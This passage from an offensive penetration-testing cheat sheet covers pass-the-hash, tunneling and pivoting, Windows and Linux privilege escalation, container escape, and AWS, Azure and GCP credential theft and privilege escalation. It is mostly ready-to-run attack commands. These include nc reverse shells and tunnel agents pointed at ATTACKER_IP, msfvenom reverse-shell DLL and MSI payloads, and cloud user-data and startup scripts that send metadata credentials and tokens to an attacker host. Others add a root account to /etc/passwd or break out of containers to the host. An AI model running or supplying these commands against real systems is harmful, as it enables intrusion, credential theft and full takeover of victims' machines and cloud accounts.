wmiexec.py -hashes LM:NT DOMAIN/user@TARGET
psexec.py -hashes LM:NT DOMAIN/user@TARGET
smbclient.py -hashes LM:NT DOMAIN/user@TARGET

# NetExec PTH
netexec smb TARGET_IP -u user -H NT_HASH -x "whoami"

# mimikatz — sekurlsa PTH
sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:NT_HASH /run:cmd.exe

# Enable PTH for non-RID500 local accounts
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System \
  /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
```

### SSH Lateral Movement

```bash
# Standard SSH lateral movement
ssh user@TARGET_IP
ssh -i id_rsa user@TARGET_IP

# SSH with Kerberos
ssh -o GSSAPIAuthentication=yes user@domain.local -vv

# Agent forwarding (key reuse attack)
ssh -A user@jump_host
# From jump_host:
ssh user@internal_host  # reuses forwarded agent
```

---

## 12. Pivoting & Tunneling

### Chisel

```bash
# Server (attacker machine)
./chisel server --reverse --port 1080

# Client (target machine) — SOCKS5 reverse proxy
./chisel client ATTACKER_IP:1080 R:socks

# Client — specific port forward
./chisel client ATTACKER_IP:1080 R:8080:INTERNAL_HOST:80

# Use with proxychains
# /etc/proxychains.conf: socks5 127.0.0.1 1080
proxychains nmap -sT -Pn -p 80,443,445 INTERNAL_SUBNET
proxychains impacket-smbclient DOMAIN/user:pass@INTERNAL_IP
```

### Ligolo-ng (Preferred for complex networks)

```bash
# Attacker — start proxy
./proxy -selfcert -laddr 0.0.0.0:11601

# Target — connect agent
./agent -connect ATTACKER_IP:11601 -ignore-cert

# In Ligolo console:
session
ifconfig
start
# Add route on attacker:
ip route add 192.168.1.0/24 dev ligolo

# Now access internal network directly (no proxychains needed)
nmap -sT -Pn 192.168.1.0/24
ssh user@192.168.1.10
```

### SSH Tunneling

```bash
# Local port forward (access remote service locally)
ssh -L 8080:INTERNAL_HOST:80 user@JUMP_HOST
# → access http://localhost:8080 → INTERNAL_HOST:80

# Remote port forward (expose local service on jump host)
ssh -R 9001:localhost:9001 user@JUMP_HOST

# Dynamic SOCKS proxy
ssh -D 1080 user@JUMP_HOST
# proxychains with socks5 127.0.0.1 1080

# Double tunnel (through two hops)
ssh -L 2222:TARGET:22 user@JUMP1
ssh -p 2222 user@localhost  # through tunnel

# SSH via ProxyJump
ssh -J jump1,jump2 user@final_target

# SSH config for pivoting
# ~/.ssh/config:
# Host internal
#   HostName 192.168.1.10
#   ProxyJump jumphost
#   User admin
```

### SSHuttle (transparent proxy)

```bash
# Route traffic through SSH tunnel without proxychains
sshuttle -r user@JUMP_HOST 192.168.1.0/24
sshuttle -r user@JUMP_HOST 192.168.1.0/24 10.10.10.0/24

# Exclude local network
sshuttle -r user@JUMP_HOST 0/0 --exclude JUMP_HOST
```

### Proxychains

```bash
# /etc/proxychains4.conf
# socks5 127.0.0.1 1080
# socks5 127.0.0.1 9050  (Tor)
# http 127.0.0.1 8080

# Usage
proxychains nmap -sT -Pn -p 22,80,443,445 10.10.10.10
proxychains python3 exploit.py
proxychains curl http://10.10.10.10/
proxychains impacket-psexec DOMAIN/user:pass@10.10.10.10

# Quiet mode
proxychains -q nmap -sT -Pn 10.10.10.0/24
```

### socat

```bash
# TCP port forward
socat TCP-LISTEN:8080,fork TCP:INTERNAL_HOST:80

# SOCKS5 proxy listener
socat TCP-LISTEN:1080,fork SOCKS4A:127.0.0.1:INTERNAL_HOST:22

# Bidirectional relay
socat TCP-LISTEN:1234 TCP:TARGET_IP:5678

# UDP tunnel
socat UDP-LISTEN:53,fork UDP:DNS_SERVER:53
```

### netsh Port Forwarding (Windows)

```bash
# Forward local port to remote
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 \
  connectport=80 connectaddress=INTERNAL_HOST

# List forwarders
netsh interface portproxy show all

# Remove
netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0
```

---

## 13. Windows Privilege Escalation

### Enumeration Tools

```powershell
# WinPEAS (automated)
winpeas.exe
winpeas.exe -notcolor > output.txt
winpeas.exe fast        # faster scan
winpeas.exe cmd         # cmd-based checks only

# PowerUp (PowerSploit)
powershell -exec bypass -c "Import-Module .\PowerUp.ps1; Invoke-AllChecks"

# Seatbelt
Seatbelt.exe -group=all -full
Seatbelt.exe -group=system
Seatbelt.exe NonstandardProcesses
Seatbelt.exe TokenPrivileges

# PrivescCheck
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report report -Format TXT,CSV,HTML"
```

### Token Impersonation / Potato Attacks

**Requirement:** `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege`

```powershell
# Check privileges
whoami /priv

# SeImpersonatePrivilege enabled → Potato attacks

# JuicyPotato (Windows 2008-2016, Server pre-2019)
JuicyPotato.exe -t * -p "cmd.exe /c whoami > C:\out.txt" \
  -l 1337 -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}
# Use CLSID list from: https://github.com/ohpe/juicy-potato/tree/master/CLSID

# RoguePotato (Windows 10 1809+, Server 2019)
RoguePotato.exe -r ATTACKER_IP -c "cmd.exe /c whoami" -l 9999

# PrintSpoofer (Windows 10, Server 2019 — print spooler abuse)
PrintSpoofer.exe -i -c "cmd.exe"
PrintSpoofer.exe -c "cmd.exe /c whoami"
PrintSpoofer.exe -c "C:\tools\nc.exe ATTACKER_IP 4444 -e cmd"

# GodPotato (modern, works on most Windows versions)
GodPotato.exe -cmd "cmd /c whoami"
GodPotato.exe -cmd "nc.exe -t -e C:\Windows\System32\cmd.exe ATTACKER_IP 4444"

# EfsPotato (CVE-2021-36942)
EfsPotato.exe "whoami"

# SharpEfsPotato
SharpEfsPotato.exe -p C:\Windows\system32\cmd.exe -a "/c whoami"

# SweetPotato (collection of all potato techniques)
SweetPotato.exe -e PrintSpoofer -p cmd.exe
SweetPotato.exe -e EfsRpc -p cmd.exe
SweetPotato.exe -e DCOM -p cmd.exe

# Meterpreter — incognito module
load incognito
list_tokens -u
impersonate_token "NT AUTHORITY\SYSTEM"

# Metasploit module
use exploit/windows/local/ms16_075_reflection
set SESSION 1
```

### Service Misconfigurations

```powershell
# Find writable service binaries
accesschk.exe /accepteula -uwdv C:\*.exe
Get-ServiceUnquoted   # PowerUp

# Modify service binary path
sc config "VulnService" binPath= "C:\temp\shell.exe"
sc start "VulnService"

# Weak service permissions (change config)
accesschk.exe /accepteula -uwcqv user VULNSERVICE
sc config VULNSERVICE binPath= "net localgroup administrators user /add"
net start VULNSERVICE
```

### Unquoted Service Paths

```powershell
# Find unquoted service paths
wmic service get name,displayname,pathname,startmode | \
  findstr /i "auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """

# PowerUp
Get-ServiceUnquoted
Write-ServiceBinary

# Metasploit
use exploit/windows/local/trusted_service_path

# Manual — if path is C:\Program Files\My App\service.exe
# Try: C:\Program.exe or C:\Program Files\My.exe
icacls "C:\Program Files\My App"  # Check write permission
# Place malicious binary at writable location and restart service
```

### DLL Hijacking

```powershell
# Find DLL hijack opportunities with Process Monitor
# Filter: Operation=NAME NOT FOUND, Path ends with .dll

# Common locations
# Missing DLLs in PATH directories writable by user
# Applications loading DLLs from current directory

# Tools
# dll_hijack_analyze (Sysinternals procmon + analysis)
# rattler (automated DLL hijacking scanner)

# Create malicious DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT \
  -f dll -o malicious.dll

# Copy to writable directory in service PATH
copy malicious.dll "C:\writable\path\TargetDLL.dll"
```

### SAM/SYSTEM File Extraction

```powershell
# Copy shadow copies
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM
reg save HKLM\SECURITY C:\temp\SECURITY

# Extract hashes
secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL

# HiveNightmare (CVE-2021-36934)
# icacls C:\Windows\System32\config\SAM → check if BUILTIN\Users has RX
```

### Common Kernel Exploits

| CVE | Name | Target |
|-----|------|--------|
| MS08-067 | NetAPI | Windows XP/2003/Vista |
| MS10-015 | KiTrap0D | Windows 2003/XP/Vista/7 |
| MS16-032 | Secondary Logon | Windows 7-10, Server 2008-2012 |
| MS17-010 | EternalBlue | Windows 7, Server 2008 |
| CVE-2019-1388 | UAC bypass via cert dialog | Windows 7-10 |
| CVE-2021-36934 | HiveNightmare | Windows 10/11 |

```bash
# windows-exploit-suggester
./windows-exploit-suggester.py --update
./windows-exploit-suggester.py --database 2024-01-01-mssb.xlsx --systeminfo sysinfo.txt
```

### AlwaysInstallElevated

```powershell
# Check registry keys
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# Both must be 1 to exploit

# PowerUp
Get-RegistryAlwaysInstallElevated
Write-UserAddMSI

# Create malicious MSI
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f msi -o evil.msi
msiexec /quiet /qn /i evil.msi
```

---

## 14. Linux Privilege Escalation

### Enumeration Tools

```bash
# LinPEAS
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh && ./linpeas.sh

# LinEnum
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh && ./LinEnum.sh -t

# linux-smart-enumeration
wget https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh
chmod +x lse.sh && ./lse.sh -l1

# linux-exploit-suggester
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh && ./linux-exploit-suggester.sh
```

### SUID Binaries

```bash
# Find SUID binaries
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
find / -uid 0 -perm -4000 -type f 2>/dev/null

# GTFOBins — https://gtfobins.github.io/
# Examples:
# bash SUID
bash -p                    # uid 0

# find SUID
find / -exec /bin/sh -p \; -quit

# nmap SUID (older versions)
nmap --interactive
!sh

# vim SUID
vim -c ':!/bin/sh'

# less SUID
less /etc/passwd
!/bin/sh

# cp SUID — copy /etc/passwd
echo "hacker:$(openssl passwd -1 pass123):0:0::/root:/bin/bash" >> /tmp/passwd
cp /tmp/passwd /etc/passwd
```

### Sudo Abuse

```bash
# Check sudo permissions
sudo -l

# NOPASSWD — run as root without password
sudo /bin/bash
sudo -u root /bin/bash

# LD_PRELOAD with NOPASSWD
# /etc/sudoers: user ALL=(ALL) NOPASSWD: /usr/bin/find
# Create malicious library:
cat > /tmp/priv.c << EOF
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0); setuid(0);
    system("/bin/bash");
}
EOF
gcc -fPIC -shared -o /tmp/priv.so /tmp/priv.c -nostartfiles
sudo LD_PRELOAD=/tmp/priv.so find .

# CVE-2019-14287 — sudo -u#-1 bypass
sudo -u#-1 /bin/bash  # (or sudo -u#4294967295)

# sudo_inject — token impersonation
# Requires ptrace permissions
git clone https://github.com/nongiach/sudo_inject

# GTFOBins via sudo
sudo vim -c ':!/bin/bash'
sudo awk 'BEGIN {system("/bin/bash")}'
sudo python -c 'import pty;pty.spawn("/bin/bash")'
sudo perl -e 'exec "/bin/bash";'
```

### Linux Capabilities

```bash
# List capabilities
getcap -r / 2>/dev/null
/usr/bin/getcap -r /usr/bin

# Dangerous capabilities:
# cap_setuid+ep  → setuid to root
# cap_net_raw+ep → raw sockets
# cap_sys_admin+ep → many privileged operations
# cap_dac_read_search → read any file

# python3 with cap_setuid
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# perl with cap_setuid
perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'

# vim with cap_setuid
:py3 import os; os.setuid(0)
:shell

# tar with cap_dac_read_search
tar xf /dev/null -I "python3 -c 'import os; os.system(\"/bin/bash\")'"

# openssl with cap_net_bind_service (read files)
echo "openssl s_server -key /etc/ssl/private/ssl-cert-snakeoil.key -cert /etc/ssl/certs/ssl-cert-snakeoil.pem -port 4433 -CAfile /etc/ssl/certs/ca-certificates.crt -WWW"
```

### Cron Job Abuse

```bash
# Find cron jobs
cat /etc/crontab
cat /etc/cron.d/*
ls -la /etc/cron.*
cat /var/spool/cron/crontabs/*

# Find world-writable scripts run by cron
find / -path /proc -prune -o -type f -perm -o+w -print 2>/dev/null

# If cron job runs a writable script:
echo "chmod +s /bin/bash" >> /path/to/cron_script.sh
# Wait for cron to run
/bin/bash -p

# Cron PATH manipulation
# If cron PATH starts with user-writable dir:
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash" > /home/user/systemupdate.sh
chmod +x /home/user/systemupdate.sh
# Wait → /tmp/bash -p

# pspy — monitor processes without root
./pspy64
```

### Writable /etc/passwd

```bash
# If /etc/passwd is writable:
openssl passwd -1 -salt hacker password123
echo "hacker:\$1\$hacker\$TzyKlv0/R/c28R.GAeLw.1:0:0::/root:/bin/bash" >> /etc/passwd
su hacker
```

### Kernel Exploits

```bash
# CVE-2022-0847 — DirtyPipe (Linux 5.8-5.16)
# Overwrite read-only files via pipe
git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits
cd CVE-2022-0847-DirtyPipe-Exploits
gcc -o exploit1 exploit-1.c
./exploit1  # modifies /etc/passwd

# CVE-2016-5195 — DirtyCow (Linux < 4.8.3)
git clone https://github.com/dirtycow/dirtycow.github.io
gcc -pthread c0w.c -o c0w
./c0w  # modifies /usr/bin/passwd to root shell

# CVE-2021-4034 — PwnKit (polkit pkexec)
git clone https://github.com/ly4k/PwnKit
cd PwnKit && make
./PwnKit  # instant root

# Compile exploits on target (if internet accessible)
# Or transfer pre-compiled binary via wget/curl/SCP
```

### Docker / Container Escape

```bash
# Check if in Docker container
cat /.dockerenv
cat /proc/1/cgroup | grep docker
env | grep DOCKER

# Docker socket escape (if mounted)
ls -la /var/run/docker.sock
docker -H unix:///var/run/docker.sock run -it -v /:/host alpine chroot /host bash

# --privileged container escape
# Check: cat /proc/self/status | grep CapEff (should be all 1s)
fdisk -l           # find host disk
mkdir /mnt/host
mount /dev/sda1 /mnt/host
chroot /mnt/host bash

# Abusing capabilities in container
# cap_sys_admin:
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "id > $host_path/output" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
cat /output

# LXC/LXD escape
lxc image import ./alpine.tar.gz --alias myimage
lxc init myimage mycontainer -c security.privileged=true
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
lxc start mycontainer
lxc exec mycontainer /bin/sh
# Now in /mnt/root you have host filesystem
```

---

## 15. Cloud — AWS

### Enumeration Tools

```bash
# Pacu (AWS exploitation framework)
bash install.sh
python3 pacu.py
set_keys
run iam__enum_users_roles_policies_groups
run iam__bruteforce_permissions
run ec2__enum
run s3__enum

# enumerate-iam — brute force permissions
git clone https://github.com/andresriancho/enumerate-iam
pip install -r requirements.txt
python3 enumerate-iam.py --access-key AKIA... --secret-key SECRET...

# ScoutSuite — multi-cloud auditing
python3 scout.py aws --access-keys \
  --access-key-id AKID --secret-access-key SECRET --session-token TOKEN

# CloudFox — situational awareness
cloudfox aws --profile profile_name all-checks
cloudfox aws --profile profile_name inventory
cloudfox aws --profile profile_name permissions --principal arn:...

# PMapper — IAM privilege escalation paths
pipenv install principalmapper
pmapper graph --create --profile PROFILE
pmapper visualize --filetype png
pmapper analysis --output-type text

# CloudMapper
python3 cloudmapper.py collect --account ACCOUNT_ID
python3 cloudmapper.py find_admins --account ACCOUNT_ID
python3 cloudmapper.py webserver --account ACCOUNT_ID

# cloudsplaining — IAM least privilege analysis
cloudsplaining download --profile myprofile
cloudsplaining scan --input-file default.json
```

### IAM Enumeration

```bash
# Basic info
aws sts get-caller-identity
aws iam get-user
aws iam list-users
aws iam list-groups
aws iam list-roles
aws iam list-policies --scope Local

# Get user policies
aws iam list-attached-user-policies --user-name USER
aws iam list-user-policies --user-name USER
aws iam get-user-policy --user-name USER --policy-name POLICY

# Get role policies
aws iam list-attached-role-policies --role-name ROLE
aws iam get-role-policy --role-name ROLE --policy-name POLICY

# Get group policies
aws iam list-group-policies --group-name GROUP
aws iam get-group-policy --group-name GROUP --policy-name POLICY

# Get inline policy document
aws iam get-policy-version --policy-arn ARN --version-id v1

# Enumerate all permissions (enumerate-iam)
python3 enumerate-iam.py --access-key AKIA... --secret-key SECRET

# Check for admin access
aws iam simulate-principal-policy \
  --policy-source-arn ARN \
  --action-names "*"
```

### EC2 IMDS (Instance Metadata Service)

```bash
# IMDSv1 (no token required — deprecated)
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME

# IMDSv2 (token required)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME

# Use obtained credentials
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
aws sts get-caller-identity
```

### S3 Attacks

```bash
# Enumerate buckets
aws s3 ls
aws s3 ls s3://BUCKET_NAME
aws s3 ls --recursive s3://BUCKET_NAME

# Find publicly accessible buckets
# bucket-finder, AWSBucketDump, or manually:
curl -I https://BUCKET_NAME.s3.amazonaws.com

# Public bucket access
aws s3 ls s3://BUCKET_NAME --no-sign-request
aws s3 sync s3://BUCKET_NAME /local/path --no-sign-request

# Check bucket ACL
aws s3api get-bucket-acl --bucket BUCKET_NAME
aws s3api get-bucket-policy --bucket BUCKET_NAME

# Upload to bucket (if writable)
aws s3 cp malicious.html s3://BUCKET_NAME/

# Pre-signed URL attack (steal credentials via SSRF)
# Victim accesses SSRF URL → requests s3 with their credentials
# Captured in access logs
```

### IAM Privilege Escalation

```bash
# Common IAM privesc paths (Rhino Security Labs research):

# iam:CreatePolicyVersion — update existing policy to grant *
aws iam create-policy-version --policy-arn ARN \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
  --set-as-default

# iam:SetDefaultPolicyVersion — switch to permissive version
aws iam set-default-policy-version --policy-arn ARN --version-id v2

# iam:AttachUserPolicy — attach admin policy to self
aws iam attach-user-policy --user-name USER \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# iam:AttachGroupPolicy
aws iam attach-group-policy --group-name GROUP \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# iam:AddUserToGroup — add self to admin group
aws iam add-user-to-group --user-name USER --group-name ADMIN_GROUP

# iam:UpdateAssumeRolePolicy — assume any role
aws iam update-assume-role-policy --role-name ROLE \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"AWS":"arn:aws:iam::ACCOUNT:user/USER"},"Action":"sts:AssumeRole"}]}'
aws sts assume-role --role-arn arn:aws:iam::ACCOUNT:role/ROLE --role-session-name attack

# iam:PassRole + ec2:RunInstances — create instance with privileged role
aws ec2 run-instances --image-id ami-xxx --instance-type t2.micro \
  --iam-instance-profile Name=ADMIN_PROFILE \
  --user-data "#!/bin/bash; curl http://ATTACKER/$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME)"
```

### STS Role Chaining

```bash
# Assume a role
aws sts assume-role --role-arn arn:aws:iam::ACCOUNT:role/ROLE \
  --role-session-name SESSION_NAME

# Use temporary credentials
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...

# Chain multiple roles
aws sts assume-role --role-arn arn:aws:iam::OTHER_ACCOUNT:role/CROSS_ACCOUNT_ROLE \
  --role-session-name chained
```

### Lambda Attacks

```bash
# Enumerate Lambda functions
aws lambda list-functions
aws lambda get-function --function-name FUNCTION

# Get function environment variables (may contain secrets)
aws lambda get-function-configuration --function-name FUNCTION

# Update function code (if lambda:UpdateFunctionCode)
# Create malicious zip
zip function.zip lambda_function.py
aws lambda update-function-code --function-name FUNCTION \
  --zip-file fileb://function.zip

# Invoke function
aws lambda invoke --function-name FUNCTION \
  --payload '{"cmd":"id"}' output.json

# Lambda execution role — steal credentials from IMDS inside Lambda
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

---

## 16. Cloud — Azure / Entra ID

### Enumeration Tools

```bash
# AzureHound — BloodHound data collector for Azure
./azurehound --refresh-token REFRESH_TOKEN list --tenant TENANT_ID -o output.json
./azurehound -u user@contoso.com -p pass list groups --tenant contoso.onmicrosoft.com

# ROADrecon
roadrecon auth --access-token TOKEN
roadrecon auth --prt-cookie COOKIE -r msgraph -c CLIENT_ID
roadrecon gather
roadrecon gui   # Web UI at localhost:5000

# GraphRunner (PowerShell — Microsoft Graph API)
Import-Module .\GraphRunner.ps1
Invoke-GraphRecon -Tokens $tokens -PermissionEnum
Invoke-DumpCAPS -Tokens $tokens -ResolveGuids
Invoke-DumpApps -Tokens $tokens

# MicroBurst
Import-Module .\MicroBurst.psm1
Invoke-EnumerateAzureSubDomains -Base targetcompany
Get-AzDomainInfo -Folder output/ -Graph

# AADInternals
Install-Module AADInternals
Import-Module AADInternals
Get-AADIntTenantDetails -Domain "company.com"
Invoke-AADIntReconAsOutsider -Domain company.com
```

### Entra ID (Azure AD) Enumeration

```bash
# Azure CLI
az login
az account list
az ad user list
az ad group list
az ad sp list  # Service Principals / App Registrations
az role assignment list --all
az role definition list

# PowerShell AzureAD module
Connect-AzureAD
Get-AzureADUser -All $true
Get-AzureADGroup -All $true
Get-AzureADGroupMember -ObjectId GROUP_ID
Get-AzureADServicePrincipal -All $true
Get-AzureADDirectoryRole
Get-AzureADDirectoryRoleMember -ObjectId ROLE_ID

# Check current user permissions
Get-AzContext
Get-AzRoleAssignment -SignInName user@domain.com
```

### Managed Identity Exploitation

```bash
# From inside an Azure VM/Function/App
# IMDSv1 equivalent
curl -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# Parse response for access_token
ACCESS_TOKEN=$(curl -s -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" | python3 -c "import json,sys; print(json.load(sys.stdin)['access_token'])")

# Use token for ARM API
curl -H "Authorization: Bearer $ACCESS_TOKEN" \
  https://management.azure.com/subscriptions?api-version=2020-01-01

# Get Key Vault secrets with managed identity
ACCESS_TOKEN=$(curl -s -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net" | python3 -c "import json,sys; print(json.load(sys.stdin)['access_token'])")
curl -H "Authorization: Bearer $ACCESS_TOKEN" \
  https://VAULT_NAME.vault.azure.net/secrets?api-version=7.0
```

### Key Vault Attacks

```bash
# List Key Vaults (if authorized)
az keyvault list
az keyvault show --name VAULT_NAME

# List secrets
az keyvault secret list --vault-name VAULT_NAME

# Get secret value
az keyvault secret show --vault-name VAULT_NAME --name SECRET_NAME

# API directly
curl -H "Authorization: Bearer $TOKEN" \
  "https://VAULT.vault.azure.net/secrets/SECRET_NAME?api-version=7.3"

# Keys and certificates
az keyvault key list --vault-name VAULT_NAME
az keyvault certificate list --vault-name VAULT_NAME
```

### RBAC Escalation

```bash
# Find over-privileged roles
az role assignment list --all --output table

# Check for Owner/Contributor on subscription
az role assignment list --scope /subscriptions/SUB_ID

# If Owner: assign yourself Global Administrator
# This requires Microsoft Graph permissions

# Check Privileged Identity Management (PIM) assignments
# If eligible → activate role

# Service Principal secrets
az ad sp credential list --id SP_OBJECT_ID
az ad sp credential reset --id SP_OBJECT_ID  # If owned

# Application credential abuse
# Access tokens for app → check Graph permissions
```

### Azure AD Token Theft

```bash
# PRT (Primary Refresh Token) — obtained from joined device
# ROADtools PRT → FOCI tokens

# Device code phishing (token theft)
# MFASweep, TokenTacticsV2

# OIDC token from Azure IMDS
curl -H Metadata:true \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com"
```

---

## 17. Cloud — GCP

### Enumeration

```bash
# Basic info
gcloud config list
gcloud auth list
gcloud projects list
gcloud compute instances list
gcloud iam roles list --project PROJECT_ID

# Service account enumeration
gcloud iam service-accounts list
gcloud iam service-accounts get-iam-policy SA@PROJECT.iam.gserviceaccount.com

# Project IAM policy
gcloud projects get-iam-policy PROJECT_ID
gcloud projects get-iam-policy PROJECT_ID \
  --flatten="bindings[].members" --format="table(bindings.role)"

# Storage buckets
gsutil ls
gsutil ls gs://BUCKET_NAME
gsutil ls -la gs://BUCKET_NAME

# GCE instances
gcloud compute instances list
gcloud compute instances describe INSTANCE --zone ZONE

# Cloud Functions
gcloud functions list
gcloud functions describe FUNCTION_NAME --region REGION

# gcp_enum script
./gcp_enum
```

### GCP Metadata Server

```bash
# Instance metadata (169.254.169.254 or metadata.google.internal)
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys

# Use token
TOKEN=$(curl -s -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token \
  | python3 -c "import json,sys; print(json.load(sys.stdin)['access_token'])")

# List projects
curl -H "Authorization: Bearer $TOKEN" \
  https://cloudresourcemanager.googleapis.com/v1/projects
```

### GCP Privilege Escalation

```bash
# Common escalation paths (Rhino Security Labs research):

# iam.serviceAccounts.actAs — impersonate service account
gcloud compute instances create INSTANCE \
  --service-account=PRIVILEGED_SA@PROJECT.iam.gserviceaccount.com \
  --zone ZONE

# iam.serviceAccounts.getAccessToken — get token directly
curl -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/TARGET_SA:generateAccessToken \
  -d '{"scope":["https://www.googleapis.com/auth/cloud-platform"]}'

# compute.instances.setMetadata — modify startup script
gcloud compute instances add-metadata INSTANCE --zone ZONE \
  --metadata startup-script='#!/bin/bash
  TOKEN=$(curl -s -H "Metadata-Flavor:Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token | python3 -c "import json,sys;print(json.load(sys.stdin)[\"access_token\"])")
  curl "http://ATTACKER/token?t=$TOKEN"'

# storage.objects.get on startup script bucket — read scripts
gsutil cp gs://BUCKET/startup.sh /tmp/startup.sh

# deploymentmanager.deployments.create — deploy new resources
# cloudFunctions.functions.create — create function with SA
# setIamPolicy on resources

# GCF with service account
gcloud functions deploy FUNC_NAME \
  --runtime python39 \
  --trigger-http \
  --service-account=PRIVILEGED_SA@PROJECT.iam.gserviceaccount.com \
  --source /path/to/exploit

# GKE — access node service account credentials
# From within a pod
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

### GCS (Google Cloud Storage)

```bash
# Check for public buckets
gsutil ls gs://BUCKET_NAME
gsutil ls -la gs://BUCKET_NAME --no-user-output

# Check bucket IAM
gsutil iam get gs://BUCKET_NAME

# Find sensitive files
gsutil ls -r gs://BUCKET_NAME | grep -E "(pass|secret|key|cred|token|config)"

# Alluser or allAuthenticatedUsers read
curl https://storage.googleapis.com/BUCKET_NAME/file.txt

# Download bucket
gsutil -m cp -r gs://BUCKET_NAME /local/path
```

### GKE Container Escape

```bash
# Check if privileged pod
cat /proc/self/status | grep CapEff
# CapEff: 0000003fffffffff → privileged

# Check mounted devices
fdisk -l 2>/dev/null
lsblk

# Mount host filesystem
mkdir /mnt/host
mount /dev/sda1 /mnt/host
chroot /mnt/host bash

# Access node service account token
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Use Kubernetes API with SA token
KUBE_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -sk -H "Authorization: Bearer $KUBE_TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/kube-system/secrets

# sa-hunter — identify privileged service accounts
./sa-hunter -token $KUBE_TOKEN -host kubernetes.default.svc:443
```

---

## 18. Network Services Attacks

### SMB

```bash
# Enumeration
smbclient -L \\\\TARGET_IP -U user%pass
smbmap -H TARGET_IP -u user -p pass
netexec smb TARGET_IP -u user -p pass --shares
netexec smb TARGET_IP -u user -p pass -M spider_plus

# Null session (anonymous)
smbclient -L \\\\TARGET_IP -N
smbmap -H TARGET_IP

# Access shares
smbclient \\\\TARGET_IP\\SHARE -U user%pass
smbclient \\\\TARGET_IP\\C$ -U Administrator%pass

# Download all files
